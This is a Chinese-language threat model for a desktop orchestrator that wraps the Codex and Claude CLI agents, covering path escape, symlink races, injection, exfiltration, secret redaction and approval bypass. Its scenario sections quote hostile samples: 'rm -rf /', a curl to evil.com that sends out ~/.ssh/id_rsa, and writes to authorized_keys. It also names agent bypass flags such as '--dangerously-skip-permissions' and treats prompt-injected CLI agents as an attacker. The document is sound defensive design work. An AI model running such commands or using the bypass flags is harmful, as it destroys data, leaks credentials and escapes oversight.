# kruon Workspace/Policy 威胁模型 v1

> **文档标识**: S1-06-TM-v1  
> **依据**: `kruon_MVP开发计划_2026-07-11.md` §3.2 模块边界、§3.4 审批不对称、§5.1 M0 退出标准  
> **代码基**: `spikes/cli-adapters/` (capability_manifest.py, event_parser.py, probe.py, normalized_event.schema.json)  
> **证据等级**: `verified` = 代码/帮助文本/测试已覆盖; `inferred` = 架构设计但未运行验证; `unverified` = 尚未实现或未测试  
> **日期**: 2026-07-14  
> **作者**: S1-06 安全审查支线

> **M4 增量（2026-07-17）**：本文详细条目保留 W1/spike 时点证据。当前产品实现已加入可信 Workspace 持久化及撤销、Run 启动前二次校验、Artifact/完成报告范围验证、固定只读适配器、`env_clear`、有界输出、元数据诊断白名单、SQLite `NOFOLLOW` 与 Unix `0700/0600`。网络出口、OS 级文件沙箱、运行期 TOCTOU、进程组逃逸和 CLI 二进制来源证明仍开放；精确版本矩阵只证明兼容性，不证明可执行文件完整性。M4 当前风险登记和外部复现入口见 [M4 external security review packet](M4-external-security-review-packet-2026-07-17.md)。

---

## 目录

1. [资产、信任边界与攻击者假设](#1-资产信任边界与攻击者假设)
2. [威胁项](#2-威胁项)
   - [T-01 路径越界](#t-01-路径越界)
   - [T-02 符号链接与 TOCTOU](#t-02-符号链接与-toctou)
   - [T-03 命令和参数注入](#t-03-命令和参数注入)
   - [T-04 网络外传](#t-04-网络外传)
   - [T-05 Secret 与日志泄漏](#t-05-secret-与日志泄漏)
   - [T-06 工作区信任](#t-06-工作区信任)
   - [T-07 审批参数绑定与漂移](#t-07-审批参数绑定与漂移)
   - [T-08 危险 Bypass](#t-08-危险-bypass)
   - [T-09 进程树/取消/残留](#t-09-进程树取消残留)
   - [T-10 恢复与未知终态](#t-10-恢复与未知终态)
   - [T-11 Artifact 越界](#t-11-artifact-越界)
   - [T-12 诊断包脱敏](#t-12-诊断包脱敏)
3. [W1 阻断门](#3-w1-阻断门)
4. [安全测试清单](#4-安全测试清单)
5. [非目标](#5-非目标)
6. [责任模块矩阵](#6-责任模块矩阵)
7. [自检结果](#7-自检结果)

---

## 1. 资产、信任边界与攻击者假设

### 1.1 资产

| 资产 | 描述 | 机密性 | 完整性 | 可用性 |
|------|------|--------|--------|--------|
| 工作区文件 | 用户代码、数据、配置、凭据文件 | ★★★ | ★★★ | ★★ |
| 上游 CLI Token | Codex/Claude 的 API 凭据（macOS Keychain 持有） | ★★★ | ★★ | ★★ |
| 事件存储 (SQLite) | Run 历史、审批记录、审计日志 | ★★ | ★★★ | ★★ |
| 审批决策记录 | 用户批准/拒绝的参数绑定与时间戳 | ★★ | ★★★ | ★ |
| 系统进程表 | 非授权进程创建、残留进程 | — | ★★★ | ★★ |
| 网络出口 | 未经用户知晓的外发请求 | ★★★ | ★ | ★ |
| 诊断包 | 脱敏后的运行记录（需保证不可逆脱敏） | ★★ | ★★ | ★ |

### 1.2 信任边界

```
┌─────────────────────────────────────────────────────────┐
│                     kruon 进程空间                        │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐              │
│  │  Domain   │  │  Policy  │  │ Process  │              │
│  │  Core     │◄─┤  Engine  │◄─┤Supervisor│              │
│  └──────────┘  └──────────┘  └────┬─────┘              │
│                                    │                     │
│  ┌──────────┐  ┌──────────┐  ┌────▼─────┐              │
│  │  Event   │  │ Artifact │  │  Adapter  │              │
│  │  Store   │  │ Service  │  │   Host    │              │
│  └──────────┘  └──────────┘  └────┬─────┘              │
│                                    │                     │
│  ┌──────────┐  ┌──────────┐       │                     │
│  │Desktop UI│  │World View│       │                     │
│  └──────────┘  └──────────┘       │                     │
└────────────────────────────────────┼─────────────────────┘
                                     │
              ┌──────────────────────▼──────────────────────┐
              │           信任边界 1: 进程隔离               │
              │  Adapter Host 启动子进程 (Codex/Claude CLI) │
              │  stdin/stdout/stderr 管道通信               │
              └──────────────────────▲──────────────────────┘
                                     │
              ┌──────────────────────┴──────────────────────┐
              │           信任边界 2: 工作区文件系统          │
              │  CLI 子进程在 Workspace 目录内读写文件       │
              │  符号链接可指向边界外                        │
              └─────────────────────────────────────────────┘
                                     │
              ┌──────────────────────▼──────────────────────┐
              │           信任边界 3: 网络出口               │
              │  CLI 子进程可发起 API 调用（上游 LLM API）  │
              │  也可能被利用进行数据外传                    │
              └─────────────────────────────────────────────┘
```

**信任边界 1** (进程隔离): kruon 与 CLI 子进程之间通过管道通信。子进程不应被信任——它可能被恶意 prompt 操纵。

**信任边界 2** (文件系统): CLI 子进程的工作目录是受信工作区，但符号链接、重命名和 TOCTOU 可导致越界写入。

**信任边界 3** (网络): CLI 子进程需要访问上游 LLM API，但不应能外传数据到任意第三方端点。

### 1.3 攻击者假设

| 攻击者模型 | 能力 | 约束 |
|-----------|------|------|
| A1: 恶意 Prompt 注入 | 通过 Task 描述注入指令，操纵 CLI 执行非预期动作 | 不能修改 kruon 二进制或策略配置 |
| A2: 恶意 Artifact 名称 | 控制文件名/路径，利用符号链接或特殊字符越界 | 不能直接执行 shell 命令 |
| A3: 本地非授权用户 | 同一 macOS 系统的其他用户尝试访问 kruon 数据 | 不能获取 kruon 进程的 IPC 通道 |
| A4: 受损 CLI 版本 | 安装的 Codex/Claude 被篡改或降级 | 不能绕过 kruon 的版本检查 |
| A5: 网络中间人 | 拦截或篡改 CLI 与上游 API 的通信 | 不能绕过 TLS（假设 TLS 由系统处理） |

**kruon 不防御**: 内核级 rootkit、硬件攻击、物理访问攻击、侧信道攻击。

---

## 2. 威胁项

### T-01 路径越界

**场景**: CLI 子进程写入 `../../etc/cron.d/malicious` 或 `/Users/izzy/.ssh/authorized_keys`，越过工作区边界修改系统关键文件。

**影响**: ★★★ 严重 — 攻击者可获得持久化、权限提升或数据窃取。

**预防**:
- `verified` — `event_parser.py:_path_in_workspace()` 使用 `os.path.realpath()` 规范化路径后检查前缀匹配，并对绝对路径（无工作区时）或越界路径返回 `false` 标记；它本身不拒绝写入
- `inferred` — Policy Engine 应在 `LaunchPlan` 构建时冻结工作区边界，并在执行前拒绝或请求审批
- `unverified` — Process Supervisor 应在 spawn 前采用经过验证且受当前 macOS 支持的隔离方案限制文件系统可见性

**检测**:
- `verified` — 事件 schema 中 `artifact.in_workspace: false` 标记越界 artifact
- `inferred` — Policy Engine 可对越界 artifact 事件发出告警并阻止 Run 继续，但此时只能限制后续操作，不能阻止已经发生的写入

**恢复**:
- 越界 artifact 事件被记录但文件已写入——kruon 无法回滚已写入的文件
- 用户需手动检查并删除越界文件
- Run 应被标记为 `failed` 或 `unknown`，不自动继续

**测试证据**:
- `verified` — `test_event_parser.py` 中 `_path_in_workspace` 的单元测试覆盖了相对路径、绝对路径、越界路径
- `inferred` — 需要集成测试：真实 CLI 尝试写入越界路径时，Policy Engine 拒绝

**剩余风险**: 高。`_path_in_workspace()` 仅在事件解析后标记，不阻止实际写入。真正的文件系统隔离需要 macOS Sandbox / Seatbelt，这尚未实现。

**责任模块**: Policy Engine (检测) → Process Supervisor (执行隔离) → Event Store (记录)

---

### T-02 符号链接与 TOCTOU

**场景**: 
1. 用户在受信工作区内创建符号链接 `link -> /etc/passwd`
2. CLI 写入 `link`，实际写入 `/etc/passwd`
3. 或者：CLI 检查文件存在后、写入前，符号链接被替换（TOCTOU）

**影响**: ★★★ 严重 — 与路径越界相同，但更难检测。

**预防**:
- `verified` — `_path_in_workspace()` 使用 `os.path.realpath()` 解析符号链接，能检测到已存在的链接指向越界
- `unverified` — 需要在写入前重新检查路径解析结果（TOCTOU 窗口）
- `unverified` — 考虑使用 macOS `open()` 的 `O_NOFOLLOW` 标志或 `fcntl` 锁定

**检测**:
- `inferred` — Policy Engine 可在 artifact 事件到达时重新解析路径并比较两次结果
- `unverified` — 审计日志应记录路径解析链

**恢复**:
- 同 T-01，无法回滚已写入文件
- 对检测到的符号链接攻击，Run 应立即终止

**测试证据**:
- `unverified` — 需要专门的符号链接 fixture 和集成测试
- 当前 synthetic fixture 未覆盖符号链接场景

**剩余风险**: 高。TOCTOU 窗口在 spike 阶段完全未防御。生产实现必须使用原子操作或 macOS 沙箱。

**责任模块**: Policy Engine (检测) → Process Supervisor (O_NOFOLLOW) → Event Store (审计)

---

### T-03 命令和参数注入

**场景**: 
1. Task 描述包含 shell 元字符：`; rm -rf /` 或 `$(curl evil.com/steal)`
2. CLI 将其解释为 shell 命令而非文本参数
3. 或：extra_args 被注入 `--dangerously-bypass-approvals-and-sandbox`

**影响**: ★★★ 严重 — 远程代码执行、权限绕过。

**预防**:
- `verified` — `capability_manifest.py:_check_safe_args()` 拒绝任何包含 DANGEROUS_FLAGS 的 argv
- `verified` — Task 文本通过 stdin 传递，不进入进程参数列表（`build_launch_plan()` 将 task 放入 `stdin_payload`）
- `verified` — LaunchPlan 会为 Codex 配置 `-s workspace-write`
- `inferred` — Claude `--permission-mode manual` 的逐动作闭环尚未用真实受控调用验证
- `inferred` — 策略引擎应在 `build_launch_plan` 阶段验证 extra_args 不包含危险模式

**检测**:
- `verified` — `_check_safe_args()` 在构建 launch plan 时检测并抛出 `UnsafeLaunchPlanError`
- `inferred` — 运行时监控 CLI 输出中的异常命令模式

**恢复**:
- LaunchPlan 构建阶段拒绝 → Run 不启动，用户看到明确错误
- 运行时注入成功 → 依赖 macOS sandbox 限制损害范围

**测试证据**:
- `verified` — `test_capability_manifest.py` 覆盖了 DANGEROUS_FLAGS 拒绝
- `verified` — `build_launch_plan()` 的 stdin 传递设计已验证
- `unverified` — 需要注入测试：包含 shell 元字符的 task 是否被 CLI 安全处理

**剩余风险**: 中。kruon 自身不注入参数，但 CLI 自身可能将 stdin 内容解释为命令。这取决于上游 CLI 的实现。

**责任模块**: Adapter Host (LaunchPlan 构建) → Policy Engine (extra_args 校验)

---

### T-04 网络外传

**场景**: CLI 子进程被 prompt 注入操纵，向攻击者控制的服务器发送 HTTP 请求（如 `curl https://evil.com/$(cat ~/.ssh/id_rsa)`）。

**影响**: ★★★ 严重 — 数据泄露。

**预防**:
- `unverified` — 当前 spike 未实现任何网络出口控制
- `inferred` — 架构设计允许 Policy Engine 定义网络策略（允许/拒绝域名列表）
- `unverified` — 可考虑 macOS `socketfilterfw` 或 `pfctl` 规则限制子进程网络
- `unverified` — 评估 Seatbelt 或其他当前 macOS 支持的子进程隔离机制；不得把 `sandbox-exec` 当作已选定的生产方案

**检测**:
- `unverified` — 无检测机制。CLI 的网络调用（LLM API）与恶意外传无法区分
- `inferred` — 可审计 CLI 子进程的 DNS 查询和连接目标

**恢复**:
- 无自动恢复。用户需手动撤销泄露的凭据

**测试证据**:
- 无。网络外传防御是 `unverified` 状态

**剩余风险**: 极高。这是当前威胁模型中最大的缺口。CLI 子进程有完整的网络访问权限，且 kruon 无法区分合法 LLM API 调用和恶意外传。

**责任模块**: Policy Engine (策略定义) → Process Supervisor (执行隔离)

---

### T-05 Secret 与日志泄漏

**场景**: 
1. CLI 输出中包含 API key、token 或密码（如 `export ANTHROPIC_API_KEY=sk-ant-...`）
2. 这些 secret 被记录到事件存储、UI 日志或诊断包
3. 或：secret 通过环境变量传递给子进程，被 `ps` 或其他进程窥视

**影响**: ★★ 高 — 凭据泄露。

**预防**:
- `verified` — `event_parser.py:redact()` 使用 6 个正则模式覆盖 OpenAI/Bearer/GitHub/Google/Slack/Anthropic token
- `verified` — `redact()` 还检测 `KEY=VALUE` 环境变量模式（SECRET/TOKEN/PASSWORD/API_KEY/APIKEY/ACCESS_KEY/CREDENTIAL）
- `verified` — `probe.py` 对所有 `run_cmd()` 输出调用 `ep.redact()`
- `inferred` — `build_launch_plan()` 的 `env_redacted` 字段用于记录脱敏后的环境变量
- `unverified` — 子进程环境变量需要显式清理（不传递宿主环境中的敏感变量）

**检测**:
- `verified` — 脱敏是主动替换，不是检测后告警
- `inferred` — 可在诊断包生成时扫描未脱敏的 secret 模式并告警

**恢复**:
- 已脱敏的数据不可逆——脱敏是破坏性操作
- 若发现未脱敏 secret 被持久化，需手动清除事件存储

**测试证据**:
- `verified` — `test_event_parser.py` 包含 secret redaction 单元测试（各种 token 格式和环境变量模式）
- `verified` — synthetic fixture 包含含 secret 的输出行

**剩余风险**: 中。正则模式可能遗漏非标准格式的 secret。脱敏在持久化前执行，但内存中的明文窗口存在。环境变量透传尚未处理。

**责任模块**: Event Parser (脱敏) → Adapter Host (环境清理) → Diagnostic Service (二次扫描)

---

### T-06 工作区信任

**场景**: 
1. 用户将 kruon 指向一个包含恶意文件的工作区（如 `post-checkout` git hook 或 `.env` 文件）
2. CLI 读取或执行这些文件
3. 或：用户误信任了不应信任的目录（如 `/tmp` 或共享目录）

**影响**: ★★ 高 — 取决于工作区内容。

**预防**:
- `verified` — `probe.py` 在 `execute_model_call()` 中检查 `plan.workspace` 是否为有效目录
- `inferred` — kruon 应在首次使用工作区时要求用户显式确认信任（类似 Claude 的 workspace trust prompt）
- `unverified` — 工作区信任状态应持久化到 SQLite，并在每次 Run 前重新验证

**检测**:
- `inferred` — 可检查工作区是否包含已知的危险文件（如 `.env` 中的 secret）
- `unverified` — 可检查工作区路径是否在系统目录或共享目录下

**恢复**:
- 取消信任后，kruon 应阻止在该工作区启动新 Run

**测试证据**:
- `unverified` — 需要工作区信任流程的集成测试

**剩余风险**: 中。工作区信任流程在 W1 spike 中未实现。M1 (DEV-102) 计划实现。

**责任模块**: Desktop UI (信任确认) → Domain Core (信任状态持久化) → Policy Engine (策略加载)

---

### T-07 审批参数绑定与漂移

**场景**: 
1. 用户批准了一个 `rm -rf /tmp/build` 命令
2. 在批准后、执行前，参数被篡改为 `rm -rf /`
3. 或：CLI 在批准后重新请求同一 fingerprint 但不同参数

**影响**: ★★★ 严重 — 审批绕过。

**预防**:
- `verified` — `capability_manifest.py:build_launch_plan()` 生成 `fingerprint`（SHA256 哈希），覆盖 adapter/workspace/task/approval_mode/argv/stdin_payload
- `verified` — `event_parser.py:fingerprint_params()` 为每个 approval.request 生成参数指纹
- `inferred` — 审批决策必须绑定到具体 fingerprint；参数变化必须重新过策略和审批
- `unverified` — 审批决策需要有效期（`expires_at`），过期后自动失效

**检测**:
- `inferred` — 当 CLI 发出 approval.request 时，比较 fingerprint 与之前批准的 fingerprint
- `unverified` — 如果 fingerprint 不匹配，拒绝执行并标记为审批绕过尝试

**恢复**:
- fingerprint 不匹配 → 拒绝执行，Run 进入 `waiting_approval` 状态，要求用户重新审批
- 记录审批绕过尝试到审计日志

**测试证据**:
- `verified` — `test_event_parser.py` 包含 fingerprint 一致性测试
- `verified` — synthetic fixture 包含 approval.request 事件
- `unverified` — 需要审批漂移的端到端测试

**剩余风险**: 中。指纹机制在 spike 中已实现，但实际审批循环（发送批准/拒绝回 CLI）尚未经过真实运行验证。Claude 的 `permission_request` 双向回传是 `inferred` 状态。

**责任模块**: Policy Engine (指纹校验) → Adapter Host (回传决策) → Event Store (记录)

---

### T-08 危险 Bypass

**场景**: 用户或 CLI 尝试使用 `--dangerously-bypass-approvals-and-sandbox` (Codex) 或 `--dangerously-skip-permissions` (Claude) 启动 Run。

**影响**: ★★★ 严重 — 完全绕过所有安全控制。

**预防**:
- `verified` — `capability_manifest.py:DANGEROUS_FLAGS` 定义了 4 个禁止标志
- `verified` — `_check_safe_args()` 在 `build_launch_plan()` 和 `extra_args` 中双重检查
- `verified` — `determine_approval_mode()` 拒绝 `bypassPermissions` 模式
- `verified` — 帮助文本分析确认这些标志在 CLI 帮助中存在（`verified_help_text`）

**检测**:
- `verified` — `UnsafeLaunchPlanError` 在构建阶段抛出，Run 不启动
- `inferred` — 审计日志记录拒绝的 bypass 尝试

**恢复**:
- Run 不启动，用户看到明确的错误消息

**测试证据**:
- `verified` — `test_capability_manifest.py` 覆盖了所有 DANGEROUS_FLAGS 的拒绝
- `verified` — `test_launch_plan.py` 覆盖了 `bypassPermissions` 模式拒绝

**剩余风险**: 低。这是当前实现最完善的防御之一。但如果攻击者能修改 `capability_manifest.py` 或 Python 运行时，则可绕过。

**责任模块**: Adapter Host (LaunchPlan 构建) → Policy Engine (校验)

---

### T-09 进程树/取消/残留

**场景**: 
1. 用户取消 Run，但 CLI 子进程未响应 SIGTERM，继续运行
2. CLI 派生了子进程（如长时间运行的测试），取消时只终止了父进程
3. 残留进程继续修改文件或外传数据

**影响**: ★★ 高 — 资源占用、未授权操作。

**预防**:
- `verified` — `probe.py:execute_model_call()` 在 approval.request 时终止进程（`proc.terminate()` → 5s 超时 → `proc.kill()`）
- `inferred` — Process Supervisor 应管理进程组（`os.setpgid()` 或 macOS `setsid()`）
- `unverified` — 需要进程树遍历（`pgid` 或 `/proc` 或 `kill -0` 检测）
- `unverified` — 取消超时策略：5s 进入 `cancelling`，10s 标记 `forced_stop_required`

**检测**:
- `verified` — `resolve_cancel_state()` 区分 `cancelled`（按时响应）和 `forced_stop_required`（超时）
- `unverified` — 残留进程检测（Run 结束后扫描进程表）

**恢复**:
- `forced_stop_required` → 发送 SIGKILL 到整个进程组
- 残留进程 → 日志告警，用户手动清理

**测试证据**:
- `verified` — synthetic fixture `codex-cancel-terminal` 和 `claude-cancel-terminal` 覆盖了取消后未知终态
- `verified` — `classify_terminal()` 和 `resolve_cancel_state()` 单元测试
- `unverified` — 需要真实进程树取消的集成测试

**剩余风险**: 高。进程组管理和残留检测在 spike 中未实现。当前 `probe.py` 只终止直接子进程。

**责任模块**: Process Supervisor (进程组管理) → Event Store (取消事件记录)

---

### T-10 恢复与未知终态

**场景**: 
1. kruon 崩溃后重启，CLI 子进程可能仍在运行
2. 或：CLI 输出流意外中断，没有明确的 terminal 事件
3. 系统将 `unknown` 终态错误地报告为 `completed`

**影响**: ★★ 高 — 状态不一致、操作遗漏。

**预防**:
- `verified` — `classify_terminal()` 在终端事件冲突时返回 `unknown`，从不强制为 `completed`
- `verified` — `normalized_event.schema.json` 将 `unknown` 定义为一等终态
- `verified` — `phase: uncertain` 用于不可恢复的未知状态
- `inferred` — SQLite 事件追加架构支持崩溃重放（DEV-008）

**检测**:
- `verified` — `classify_terminal()` 检测冲突终端信号（如 completed + failed → unknown）
- `verified` — `degraded: true` 标记低置信度事件
- `inferred` — 重启时对账：比较 SQLite 中的 Run 状态与进程表中实际运行的进程

**恢复**:
- `unknown` 终态 → 用户可手动检查并决定恢复或终止
- `uncertain` → 系统不自动操作，等待用户决策

**测试证据**:
- `verified` — synthetic fixture 覆盖了无终端事件、冲突终端事件
- `verified` — `classify_terminal()` 单元测试覆盖所有组合
- `unverified` — 需要 SQLite 崩溃重放的集成测试

**剩余风险**: 中。事件解析层正确处理了未知终态，但 SQLite 崩溃恢复和进程对账尚未实现。

**责任模块**: Event Store (重放) → Process Supervisor (对账) → Domain Core (状态恢复)

---

### T-11 Artifact 越界

**场景**: CLI 将生成的文件（代码、diff、报告）写入工作区之外，或写入工作区内但内容包含恶意代码。

**影响**: ★★ 高 — 取决于 artifact 内容和位置。

**预防**:
- `verified` — `event_parser.py:_path_in_workspace()` 标记越界 artifact
- `inferred` — Artifact Service 应在收集时验证路径，拒绝越界 artifact
- `unverified` — Artifact 内容扫描（检测恶意模式）不在 MVP 范围内

**检测**:
- `verified` — `artifact.in_workspace: false` 在事件中标记
- `inferred` — Artifact Service 可在验收前重新验证路径

**恢复**:
- 越界 artifact 不进入验收流程
- 用户被告知并手动处理

**测试证据**:
- `verified` — `_path_in_workspace()` 单元测试
- `unverified` — 需要 Artifact Service 的集成测试

**剩余风险**: 中。检测已实现但预防（阻止写入）依赖 macOS 沙箱（未实现）。

**责任模块**: Artifact Service (验证) → Event Store (记录)

---

### T-12 诊断包脱敏

**场景**: 用户生成诊断包用于调试，但其中包含未脱敏的 API token、文件路径、项目名或 prompt 内容。

**影响**: ★★ 高 — 诊断包共享时泄露敏感信息。

**预防**:
- `verified` — `event_parser.py:redact()` 在事件解析时脱敏
- `verified` — `probe.py` 对所有捕获输出调用 `redact()`
- `verified` — `diagnostics.rs` 从元数据白名单重新构造诊断包，不复制 prompt、项目身份、路径、事件正文或原始日志
- `verified` — 诊断包只接受严格归一化版本字符串和固定枚举/数值/布尔字段，最多包含最近 50 个匿名 Run 摘要

**检测**:
- `verified` — 写文件前递归检查禁止字段名与常见 secret 形态
- `verified` — Windows 驱动器/UNC 与 macOS/Linux 绝对路径触发拒绝，而不是替换后继续导出

**恢复**:
- 诊断包生成后不可撤销——需在生成前确保脱敏完整

**测试证据**:
- `verified` — `test_event_parser.py` 中的 secret redaction 测试
- `verified` — 敏感源 fixture 证明 token、prompt、项目名、完整路径、原始日志、ID 与哈希均不进入包
- `verified` — 二次扫描拒绝字段/secret/跨平台路径；原子导出测试证明失败不留最终文件或临时文件

**剩余风险**: 低至中。自定义 secret 形态无法靠模式穷举；主控制是类型化元数据白名单，二次扫描仅作为纵深防御。未来若加入日志、附件、崩溃转储或自动上传，必须重新开启 T-12 评审。

**责任模块**: Diagnostic Service (脱敏) → Event Parser (基础脱敏)

---

## 3. W1 阻断门

以下条件是 W1 结束前必须满足的阻断门（源自 `kruon_MVP开发计划_2026-07-11.md` §5.1 退出标准）：

| ID | 条件 | 当前状态 | 验证方式 |
|----|------|---------|---------|
| G-01 | 路径越界可在执行前被 Policy 拒绝或请求审批 | `inferred` — `_path_in_workspace()` 仅标记，不阻止 | 集成测试：CLI 尝试越界写入 |
| G-02 | 参数变化必须重新审批 | `inferred` — fingerprint 生成已通过单元测试，运行时重新审批尚未实现 | 单元测试 + 集成测试 |
| G-03 | 危险命令可在执行前被 Policy 拒绝 | `inferred` — 已验证 4 个 bypass 参数拒绝，通用危险命令策略尚未实现 | 单元测试 + Policy 集成测试 |
| G-04 | 取消在 5 秒内进入 `cancelling` | `unverified` — 未实现超时策略 | 集成测试 |
| G-05 | 10 秒无响应可标记 `forced_stop_required` | `inferred` — 分类函数已通过单元测试，真实超时与进程控制尚未实现 | 单元测试 + 集成测试 |
| G-06 | Run 崩溃后可从 SQLite 重建，不把未知终态伪装为完成 | `unverified` — 仅验证 unknown 不会被伪装为 completed；SQLite 重建尚未实现 | 崩溃重放集成测试 |
| G-07 | Codex 审批路径已作出书面决策 | `inferred` — 当前 spike 暂定 `sandbox_policy_only`，仍待 app-server/exec-server 协议验证后定案 | 服务协议 spike + 决策记录 |
| G-08 | 两款 CLI 均能完成最小真实任务并输出可解析的稳定事件 | `unverified` — 当前仅 10 组合成 fixture 通过，不能替代真实 CLI 运行 | 两款 CLI 的受控真实任务 |
| G-09 | 审批模式差异可被 UI 和测试表达 | `inferred` — schema/snapshot 已表达；UI 尚未实现 | schema 测试 + UI 测试 |
| G-10 | 双 CLI 深适配和本地安全模型可行 | `inferred` — 架构和 spike 成立，但缺少真实运行证据 | W1 结束演示 |

**通过 W1 阻断门需要**: 至少完成执行前工作区隔离、运行时审批指纹绑定、真实进程取消/恢复、双 CLI 受控真实任务与审批差异 UI 验证；合成 fixture 只作为契约回归证据。

---

## 4. 安全测试清单

### 4.1 单元测试（当前已覆盖）

| ID | 测试 | 覆盖威胁 | 状态 |
|----|------|---------|------|
| ST-01 | 路径规范化：相对路径、绝对路径、越界路径 | T-01, T-11 | `verified` |
| ST-02 | 符号链接解析：`os.path.realpath()` 检测越界链接 | T-02 | `verified` |
| ST-03 | DANGEROUS_FLAGS 拒绝：4 个 bypass 标志 | T-08 | `verified` |
| ST-04 | 危险 permission mode 拒绝：`bypassPermissions` | T-08 | `verified` |
| ST-05 | 参数指纹：相同参数 → 相同指纹；不同参数 → 不同指纹 | T-07 | `verified` |
| ST-06 | 终端状态分类：completed/failed/cancelled/unknown 所有组合 | T-10 | `verified` |
| ST-07 | 取消状态解析：按时响应/超时/无取消请求 | T-09 | `verified` |
| ST-08 | Secret 脱敏：6 种 token 格式 + 环境变量模式 | T-05 | `verified` |
| ST-09 | 畸形 JSON 容错：ParseError 非崩溃 | T-03 | `verified` |
| ST-10 | 未知事件降级：degraded 事件保留原始数据 | T-10 | `verified` |
| ST-11 | 空行/空白行跳过 | — | `verified` |
| ST-12 | Schema 验证：所有合成 fixture 通过 normalized_event.schema.json | 全部 | `verified` |

### 4.2 需要新增的安全测试（W2 前）

| ID | 测试 | 覆盖威胁 | 优先级 |
|----|------|---------|--------|
| ST-13 | 符号链接 TOCTOU：在检查后、写入前替换链接目标 | T-02 | P0 |
| ST-14 | 审批漂移：批准 fingerprint A，CLI 发送 fingerprint B | T-07 | P0 |
| ST-15 | 进程组取消：父进程 SIGTERM 后子进程继续运行 | T-09 | P0 |
| ST-16 | 工作区信任拒绝：在未信任目录启动 Run 被阻止 | T-06 | P0 |
| ST-17 | 网络外传阻止：CLI 子进程连接非 LLM API 端点 | T-04 | P0 |
| ST-18 | 环境变量 secret 透传：宿主环境变量被 CLI 子进程继承 | T-05 | P1 |
| ST-19 | 诊断包二次脱敏：已脱敏事件在诊断包中仍保持脱敏 | T-12 | P1 |
| ST-20 | 路径脱敏：`/Users/izzy` 被替换为 `$HOME` | T-12 | P1 |
| ST-21 | 长路径/特殊字符路径：包含空格、引号、通配符的路径 | T-01 | P1 |
| ST-22 | 并发 TOCTOU：并行 Run 同时操作同一符号链接 | T-02 | P1 |
| ST-23 | 审批过期：`expires_at` 后的审批决策被拒绝 | T-07 | P1 |
| ST-24 | 残留进程检测：Run 结束后扫描进程表发现未终止子进程 | T-09 | P2 |

### 4.3 测试策略

```
测试层级          覆盖威胁                   工具
─────────────────────────────────────────────────────
单元测试           T-01, T-05, T-07, T-08,   unittest
                   T-09, T-10, T-11
契约测试           T-01, T-07, T-10           synthetic fixture + schema
集成测试           T-01, T-02, T-03, T-04,   真实 CLI + 测试工作区
                   T-06, T-09, T-11
端到端测试         T-06, T-07, T-09, T-10    完整用户路径
安全回归           T-01~T-12                  专用安全测试套件
```

---

## 5. 非目标

以下安全领域明确不在 kruon W1-W10 MVP 范围内：

| 非目标 | 原因 | 替代方案 |
|--------|------|---------|
| 防篡改二进制签名 | MVP 阶段不防御 kruon 自身被篡改 | 依赖 macOS Gatekeeper + 代码签名（M4） |
| 全磁盘加密 | macOS 系统级功能 | 依赖 FileVault |
| 多用户隔离 | MVP 为单用户桌面应用 | 依赖 macOS 用户隔离 |
| 网络流量审计/代理 | 超出 MVP 范围 | 用户可自行配置系统代理 |
| CLI 自身安全漏洞 | kruon 不审计上游 CLI 的代码安全 | 依赖 CLI 版本兼容矩阵 + 版本降级策略 |
| 抗侧信道攻击 | 不适用于桌面应用场景 | — |
| 抗物理攻击 | 不适用于桌面应用场景 | 依赖 macOS 锁屏 + FileVault |
| 抗 DoS（资源耗尽） | MVP 不实现资源配额 | 用户手动终止 |
| 输入法/键盘记录器 | 系统级威胁 | 依赖 macOS 安全 |
| 供应链攻击（npm/pip） | 超出 kruon 控制范围 | 依赖依赖锁定 + CI 扫描 |
| 工作区文件完整性校验 | MVP 不实现文件哈希校验 | 用户可用 git 管理 |
| AI prompt 注入检测 | 当前无可靠技术方案 | 依赖审批机制 + 用户判断 |

---

## 6. 责任模块矩阵

```
威胁                    Domain Core  Policy Eng  Proc Super  Adapter Host  Event Store  Artifact Svc  Desktop UI  World View
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
T-01 路径越界              —           P/D         I           D             R            —             —           —
T-02 符号链接/TOCTOU       —           P/D         I           —             R            —             —           —
T-03 命令/参数注入         —           P           —           P/D           R            —             —           —
T-04 网络外传              —           P           I           —             R            —             —           —
T-05 Secret/日志泄漏       —           —           —           P/D           R            —             —           —
T-06 工作区信任            P           P           —           —             R            —             D           —
T-07 审批绑定/漂移         —           P/D         —           I             R            —             —           —
T-08 危险 Bypass           —           P           —           P/D           R            —             —           —
T-09 进程树/取消/残留      —           —           P/D/I       —             R            —             —           —
T-10 恢复/未知终态         P           —           D           —             P/R          —             —           —
T-11 Artifact 越界         —           P           —           —             R            D             —           —
T-12 诊断包脱敏            —           —           —           —             —            —             —           P/D

P = 预防  D = 检测  I = 隔离  R = 记录
```

---

## 7. 自检结果

### 7.1 文档完整性检查

| 检查项 | 结果 |
|--------|------|
| 覆盖计划 §3.2 所有模块边界 | ✅ |
| 覆盖计划 §5.1 S1-06 要求（越界、符号链接、命令、网络、secret） | ✅ |
| 覆盖计划 §6 适配器契约约束 | ✅ |
| 覆盖计划 §7.2 必备 fixture | ✅ |
| 覆盖计划 §8 CC-03 威胁模型审查 | ✅ |
| 每项含场景/影响/预防/检测/恢复/测试证据/剩余风险/责任模块 | ✅ |
| 明确 verified/inferred/unverified | ✅ |
| 至少 12 条安全测试 | ✅ (24 条) |
| W1 阻断门 | ✅ (10 项) |
| 非目标 | ✅ (12 项) |
| 不宣称未验证的 CLI 能力 | ✅ (真实 CLI 闭环与 per_action 均保留 inferred/unverified) |

### 7.2 关键发现摘要

```
严重性分布:
  ★★★ 严重: T-01, T-02, T-03, T-04, T-07, T-08  (6)
  ★★  高:   T-05, T-06, T-09, T-10, T-11, T-12  (6)

最大风险缺口:
  1. T-04 网络外传 — 完全无防御 (unverified)
  2. T-02 符号链接 TOCTOU — 无运行时保护 (unverified)
  3. T-01 路径越界 — 检测但不阻止 (inferred)
  4. T-09 进程组管理 — 未实现 (unverified)

最完善防御:
  1. T-08 危险 Bypass — 双重检查 + 帮助文本验证 (verified)
  2. T-05 Secret 脱敏 — 6 种模式 + 环境变量 (verified)
  3. T-10 未知终态 — 从不强制为 completed (verified)
```

### 7.3 建议的 W1 后立即行动

1. **P0**: 评估并实现当前 macOS 支持的子进程隔离方案，限制 CLI 文件系统和网络访问（解决 T-01, T-02, T-04）
2. **P0**: 实现进程组管理（`setsid()`）和残留进程检测（解决 T-09）
3. **P0**: 在 CLI 执行前由隔离层和 Policy Engine 限制越界写入；artifact 事件仅作为事后检测与终止后续操作的证据
4. **P1**: 实现审批有效期和 fingerprint 运行时校验（解决 T-07）
